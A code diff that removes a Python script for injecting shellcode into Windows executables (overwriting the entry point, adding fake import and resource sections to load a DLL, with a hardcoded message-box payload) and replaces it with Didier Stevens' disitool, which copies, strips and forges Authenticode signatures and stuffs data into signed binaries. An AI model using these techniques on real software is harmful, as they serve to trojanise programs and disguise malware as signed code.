@@ -1,192 +1,259 @@
-from vendor import disitool
-import sys
+#!/usr/bin/env python
+
+"""
+tool to manipulate digital signatures in PE files
+
+commands:
+- delete signed-file unsigned-file
+- copy signed-source-file unsigned-file signed-file
+- extract signed-file signature
+- add signature unsigned-file signed-file
+- inject [--paddata] signed-source-file data-file signed-destination-file
+
+Source code put in public domain by Didier Stevens, no Copyright
+https://DidierStevens.com
+Use at your own risk
+
+History:
+ 2007/12/21: added arguments
+ 2008/01/09: code review
+ 2008/03/26: added checksum correction
+ 2009/01/17: V0.3 added inject, requested by H D Moore
+ 2009/01/18: --paddata option
+ 2020/11/27: 0.4 Python 3
+
+requires pefile:
+ http://code.google.com/p/pefile/
+ to install: setup.py install
+"""
+
+import optparse
 import pefile
-import iced_x86
-import struct
-import os
+from struct import *
 
-def add_shellcode(pe: pefile.PE, output_path, provided_shellcode = None):
-    # pe = pefile.PE(exe_path)
+__author__ = 'Didier Stevens (https://DidierStevens.com)'
+__version__ = '0.4'
+__date__ = '2020/11/27'
 
-    shellcode = bytes(b"\xd9\xeb\x9b\xd9\x74\x24\xf4\x31\xd2\xb2\x77\x31\xc9")
-    shellcode += b"\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x46\x08"
-    shellcode += b"\x8b\x7e\x20\x8b\x36\x38\x4f\x18\x75\xf3\x59\x01\xd1"
-    shellcode += b"\xff\xe1\x60\x8b\x6c\x24\x24\x8b\x45\x3c\x8b\x54\x28"
-    shellcode += b"\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01\xeb\xe3\x34"
-    shellcode += b"\x49\x8b\x34\x8b\x01\xee\x31\xff\x31\xc0\xfc\xac\x84"
-    shellcode += b"\xc0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf4\x3b\x7c\x24"
-    shellcode += b"\x28\x75\xe1\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b"
-    shellcode += b"\x5a\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89\x44\x24\x1c"
-    shellcode += b"\x61\xc3\xb2\x08\x29\xd4\x89\xe5\x89\xc2\x68\x8e\x4e"
-    shellcode += b"\x0e\xec\x52\xe8\x9f\xff\xff\xff\x89\x45\x04\xbb\x7e"
-    shellcode += b"\xd8\xe2\x73\x87\x1c\x24\x52\xe8\x8e\xff\xff\xff\x89"
-    shellcode += b"\x45\x08\x68\x6c\x6c\x20\x41\x68\x33\x32\x2e\x64\x68"
-    shellcode += b"\x75\x73\x65\x72\x30\xdb\x88\x5c\x24\x0a\x89\xe6\x56"
-    shellcode += b"\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c"
-    shellcode += b"\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68"
-    shellcode += b"\x61\x67\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c"
-    shellcode += b"\x24\x0a\x89\xe3\x68\x58\x20\x20\x20\x68\x4d\x53\x46"
-    shellcode += b"\x21\x68\x72\x6f\x6d\x20\x68\x6f\x2c\x20\x66\x68\x48"
-    shellcode += b"\x65\x6c\x6c\x31\xc9\x88\x4c\x24\x10\x89\xe1\x31\xd2"
-    shellcode += b"\x52\x53\x51\x52\xff\xd0\x31\xc0\x50\xff\x55\x08"
-
-    shellcode = provided_shellcode or shellcode
-
-    print(shellcode)
-
-    ep = pe.OPTIONAL_HEADER.AddressOfEntryPoint
-    print("[*] Writting %d bytes at offset %s" % (len(shellcode), hex(ep)))
-    pe.set_bytes_at_offset(ep, shellcode)
-
-    pe.write(output_path)
-
-def add_dll_import(exe_path, mock_dll_name, mock_functions, output_path):
-    pe = pefile.PE(exe_path)
+def Usage():
+    """Displays the usage of this tool
+    """
     
-    # Calculate new Import Table RVA and size
-    original_import_directory = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT']]
-    new_import_directory_rva = original_import_directory.VirtualAddress + original_import_directory.Size
+    print('Usage: disitool command [options] file ...')
+    print('  disitool V%s %s, tool to manipulate digital signatures in PE files' % (__version__, __date__))
+    print('  commands:')
+    print('  - delete signed-file unsigned-file')
+    print('  - copy signed-source-file unsigned-file signed-file')
+    print('  - extract signed-file signature')
+    print('  - add signature unsigned-file signed-file')
+    print('  - inject [--paddata] signed-source-file data-file signed-destination-file')
+    print('  Source code put in the public domain by Didier Stevens, no Copyright')
+    print('  Use at your own risk')
+    print('  https://DidierStevens.com')
+
+def DeleteDigitalSignature(SignedFile, UnsignedFile=None):
+    """Deletes the digital signature from file SignedFile
+       When UnsignedFile is not None, writes the modified file to UnsignedFile
+       Returns the modified file as a PE file
+    """
     
-    # Calculate the size of a new import descriptor
-    import_descriptor_size = struct.calcsize('<LLLLL')
+    pe = pefile.PE(SignedFile)
     
-    # Create new import descriptor
-    new_import_desc = struct.pack(
-        '<LLLLL',
-        new_import_directory_rva + import_descriptor_size + len(mock_dll_name) + 1,  # OriginalFirstThunk RVA
-        0,  # TimeDateStamp
-        0,  # ForwarderChain
-        new_import_directory_rva + import_descriptor_size,  # Name RVA
-        new_import_directory_rva + import_descriptor_size + len(mock_dll_name) + 1  # FirstThunk RVA
-    )
+    address = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress
+    pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress = 0
+    pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = 0
 
-    # Calculate the size of the new import section
-    import_section_size = (len(mock_functions) + 2) * struct.calcsize('<I')  # Thunks and terminators
-    import_section_size += len(mock_dll_name) + 1  # DLL name
-    for func in mock_functions:
-        import_section_size += len(func) + 1  # Function names
-
-    # Align the new section to the next 4KB boundary
-    new_section_offset = (pe.OPTIONAL_HEADER.SizeOfImage + 0xFFF) & 0xFFFFF000
-
-    # Create new section header
-    new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
-    new_section.set_file_offset(pe.sections[-1].get_file_offset() + pe.sections[-1].sizeof())
-    new_section.Name = b'.idata'
-    new_section.Misc_VirtualSize = import_section_size
-    new_section.VirtualAddress = new_section_offset
-    new_section.SizeOfRawData = (import_section_size + 0x1FF) & 0xFFFFFE00  # Align to 512-byte boundary
-    new_section.PointerToRawData = len(pe.__data__)
-    new_section.PointerToRelocations = 0
-    new_section.PointerToLinenumbers = 0
-    new_section.NumberOfRelocations = 0
-    new_section.NumberOfLinenumbers = 0
-    new_section.Characteristics = 0x40000040  # Readable | Initialized Data
-
-    # Add the new section to the PE file
-    pe.sections.append(new_section)
-    pe.FILE_HEADER.NumberOfSections += 1
-    pe.OPTIONAL_HEADER.SizeOfImage = new_section.VirtualAddress + new_section.Misc_VirtualSize
-
-    # Update the import directory
-    pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT']].VirtualAddress = new_section.VirtualAddress
-    pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_IMPORT']].Size += import_descriptor_size
-
-    # Write the modified EXE to the output path
-    pe.write(output_path)
-
-    # Append the new import data to the modified EXE
-    with open(output_path, 'ab') as modified_exe:
-        # Write the new import descriptor
-        modified_exe.write(new_import_desc)
-        
-        # Write the DLL name
-        modified_exe.write(mock_dll_name.encode('utf-8') + b'\x00')
-        
-        # Write the thunks and function names
-        for func in mock_functions:
-            thunk_rva = new_section.VirtualAddress + import_descriptor_size + len(mock_dll_name) + 1
-            modified_exe.write(struct.pack('<I', thunk_rva + len(func) + 1))
-            modified_exe.write(func.encode('utf-8') + b'\x00')
-        
-        # Write null terminators for the thunks
-        modified_exe.write(struct.pack('<I', 0))
-        modified_exe.write(struct.pack('<I', 0))
-
-    print(f"Added mock import {mock_dll_name} with functions {mock_functions} to {exe_path} successfully.")
-
-
-def add_dll_to_exe(exe_path, dll_path, output_path):
-    # Load the EXE file
-    pe = pefile.PE(exe_path)
+    if address != 0:
+        peUnsignedFile = pefile.PE(data=pe.write()[0:address])
+    else:
+        peUnsignedFile = pefile.PE(data=pe.write())
     
-    # Read the DLL file
-    with open(dll_path, 'rb') as dll_file:
-        dll_data = dll_file.read()
-
-    # Determine the section where the DLL will be added
-    dll_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__)
-    dll_section.set_file_offset(pe.sections[-1].get_file_offset() + pe.sections[-1].sizeof())
+    peUnsignedFile.OPTIONAL_HEADER.CheckSum = peUnsignedFile.generate_checksum()
     
-    # Define the name, characteristics, and size of the new section
-    dll_section.Name = b'.rsrc'  # Name of the section, .rsrc is the resources section
-    dll_section.Misc = len(dll_data).to_bytes(4)
-    dll_section.Misc_PhysicalAddress = 0
-    dll_section.Misc_VirtualSize = len(dll_data)
-    dll_section.VirtualAddress = (pe.sections[-1].VirtualAddress + 
-                                  pe.sections[-1].Misc_VirtualSize + 
-                                  0xFFF) & 0xFFFFF000  # Align to the next 4KB boundary
-    dll_section.SizeOfRawData = (len(dll_data) + 0x1FF) & 0xFFFFFE00  # Align to the next 512-byte boundary
-    dll_section.PointerToRawData = os.path.getsize(exe_path)
-    dll_section.PointerToRelocations = 0
-    dll_section.PointerToLinenumbers = 0
-    dll_section.NumberOfRelocations = 0
-    dll_section.NumberOfLinenumbers = 0
-    dll_section.Characteristics = 0x40000040  # Readable | Initialized Data
+    new_file_data = peUnsignedFile.write()
+
+    if UnsignedFile:
+        f = open(UnsignedFile, 'wb+')
+        f.write(new_file_data)
+        f.close()
+
+    return new_file_data
+
+def CopyDigitalSignature(SignedSourceFile, UnsignedFile, SignedFile=None):
+    """Extracts the digital signature from file SignedSourceFile and adds it to file UnsignedFile
+       When SignedFile is not None, writes the modified file to SignedFile
+       Returns the modified file as a PE file
+    """
     
-    # Add the new section to the list of sections
-    pe.sections.append(dll_section)
+    peSignedSource =  pefile.PE(SignedSourceFile)
     
-    # Adjust the PE header to account for the new section
-    pe.FILE_HEADER.NumberOfSections += 1
-    pe.OPTIONAL_HEADER.SizeOfImage = (dll_section.VirtualAddress + 
-                                      dll_section.Misc_VirtualSize + 
-                                      0xFFF) & 0xFFFFF000
+    address = peSignedSource.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress
+    size = peSignedSource.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size
+
+    if address == 0:
+        print('Error: source file not signed')
+        return
+
+    signature = peSignedSource.write()[address:]
+
+    peUnsigned = DeleteDigitalSignature(UnsignedFile)
     
-    # Write the modified EXE to the output path
-    pe.write(output_path)
+    peSignedFileTemp = pefile.PE(data=peUnsigned + signature)
+
+    peSignedFileTemp.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress = len(peUnsigned)
+    peSignedFileTemp.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = size
+
+    peSignedFile = pefile.PE(data=peSignedFileTemp.write())
+    peSignedFile.OPTIONAL_HEADER.CheckSum = peSignedFile.generate_checksum()
     
-    # Append the DLL data to the modified EXE
-    with open(output_path, 'ab') as modified_exe:
-        modified_exe.write(dll_data)
+    new_file_data = peSignedFile.write()
     
-    print(f"Embedded {dll_path} into {exe_path} successfully.")
+    if SignedFile:
+        f = open(SignedFile, 'wb+')
+        f.write(new_file_data)
+        f.close()
 
+    return new_file_data
 
-def add_shellcode_from_exe(pe: pefile.PE, shell_exe: pefile.PE):
-    for section in shell_exe.sections:
-        print(section.Name)
-        if section.Name.startswith(b".text"):
-            shellcode = section.get_data()
-            add_shellcode(pe, "stage-two-tmp.exe", provided_shellcode=shellcode)
-
-def main():
-    exe = pefile.PE(sys.argv[1])
-
-    print(exe.DIRECTORY_ENTRY_IMPORT)
-
-
-    for entry in exe.DIRECTORY_ENTRY_IMPORT:
-        print(entry.dll)
-        for imp in entry.imports:
-            print('\t', hex(imp.address), imp.name)
-
-    add_shellcode_from_exe(pefile.PE(sys.argv[1]), pefile.PE(sys.argv[2]))
-
-    # add_shellcode(sys.argv[1], "stage-one-tmp.exe")
-    # add_dll_to_exe(sys.argv[1], sys.argv[2], "stage-one-tmp.exe")
-    # add_dll_import("stage-one-tmp.exe", sys.argv[2], ["DnsPluginInitialize"], sys.argv[3])
+def ExtractDigitalSignature(SignedFile, SignatureFile=None):
+    """Extracts the digital signature from file SignedFile
+       When SignatureFile is not None, writes the signature to SignatureFile
+       Returns the signature
+    """
     
+    pe =  pefile.PE(SignedFile)
 
-if __name__ == "__main__":
-    main()
+    address = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress
+    size = pe.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size
+
+    if address == 0:
+        print('Error: source file not signed')
+        return
+    
+    signature = pe.write()[address+8:]
+    
+    if SignatureFile:
+        f = open(SignatureFile, 'wb+')
+        f.write(signature)
+        f.close()
+
+    return signature
+
+def AddDigitalSignature(SignatureFile, UnsignedFile, SignedFile=None):
+    """Adds the digital signature from file SignatureFile to file UnsignedFile
+       When SignedFile is not None, writes the modified file to SignedFile
+       Returns the modified file as a PE file
+    """
+    
+    f = open(SignatureFile, 'rb')
+    signature = f.read()
+    f.close()
+    
+    size = len(signature) + 8
+    
+    peUnsigned = DeleteDigitalSignature(UnsignedFile)
+    
+    peSignedFileTemp = pefile.PE(data=peUnsigned + pack('<I', size) + b'\x00\x02\x02\x00' + signature)
+
+    peSignedFileTemp.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress = len(peUnsigned)
+    peSignedFileTemp.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = size
+
+    peSignedFile = pefile.PE(data=peSignedFileTemp.write())
+    peSignedFile.OPTIONAL_HEADER.CheckSum = peSignedFile.generate_checksum()
+
+    new_file_data = peSignedFile.write()
+    
+    if SignedFile:
+        f = open(SignedFile, 'wb+')
+        f.write(new_file_data)
+        f.close()
+
+    return new_file_data
+
+def InjectDataInSignedExecutable(SignedSourceFile, DataFile, SignedFile=None, paddata=False):
+    """Inject data (DataFile) inside a signed executable (SignedSourceFile) without invalidating the signature
+       The procedure is to append the data to the digital signature and increase the size of the digital signature
+       When SignedFile is not None, writes the modified file to SignedFile
+       Returns the modified file as a PE file
+    """
+    
+    peSignedSource =  pefile.PE(SignedSourceFile)
+    
+    address = peSignedSource.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].VirtualAddress
+    size = peSignedSource.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size
+
+    if address == 0:
+        print('Error: source file not signed')
+        return
+
+    f = open(DataFile, 'rb')
+    DataToInject = f.read()
+    f.close()
+
+    if len(DataToInject) % 8 != 0:
+        if paddata:
+            DataToInject = DataToInject + b'\x00' * (8 - (len(DataToInject) % 8))
+            print('Info: padded the data to inject')
+        else:
+            print('Warning: the length of the data to inject is not a multiple of 8')
+    
+    signature = peSignedSource.write()[address:]
+
+    peUnsigned = peSignedSource.write()[:address]
+
+    peSignedFileTemp = pefile.PE(data=peUnsigned + signature + DataToInject)
+
+    peSignedFileTemp.OPTIONAL_HEADER.DATA_DIRECTORY[pefile.DIRECTORY_ENTRY['IMAGE_DIRECTORY_ENTRY_SECURITY']].Size = size + len(DataToInject)
+
+    peSignedFile = pefile.PE(data=peSignedFileTemp.write())
+    peSignedFile.OPTIONAL_HEADER.CheckSum = peSignedFile.generate_checksum()
+    
+    new_file_data = peSignedFile.write()
+    
+    if SignedFile:
+        f = open(SignedFile, 'wb+')
+        f.write(new_file_data)
+        f.close()
+
+    return new_file_data
+
+def Main():
+    """Parses the command line and executes the appropriate function
+    """
+    
+    oParser = optparse.OptionParser(usage='usage: %prog [options] command files...', version='%prog ' + __version__)
+    oParser.add_option('-p', '--paddata', action='store_true', default=False, help='pad data to a multiple of 8 bytes')
+    (options, args) = oParser.parse_args()
+
+    if len(args) == 0:
+        Usage()
+    elif args[0] == 'delete':
+        if len(args) == 3:
+            DeleteDigitalSignature(args[1], args[2])
+        else:
+            Usage()
+    elif args[0] == 'copy':
+        if len(args) == 4:
+            CopyDigitalSignature(args[1], args[2], args[3])
+        else:
+            Usage()
+    elif args[0] == 'extract':
+        if len(args) == 3:
+            ExtractDigitalSignature(args[1], args[2])
+        else:
+            Usage()
+    elif args[0] == 'add':
+        if len(args) == 4:
+            AddDigitalSignature(args[1], args[2], args[3])
+        else:
+            Usage()
+    elif args[0] == 'inject':
+        if len(args) == 4:
+            InjectDataInSignedExecutable(args[1], args[2], args[3], options.paddata)
+        else:
+            Usage()
+    else:
+        Usage()
+
+if __name__ == '__main__':
+    Main()
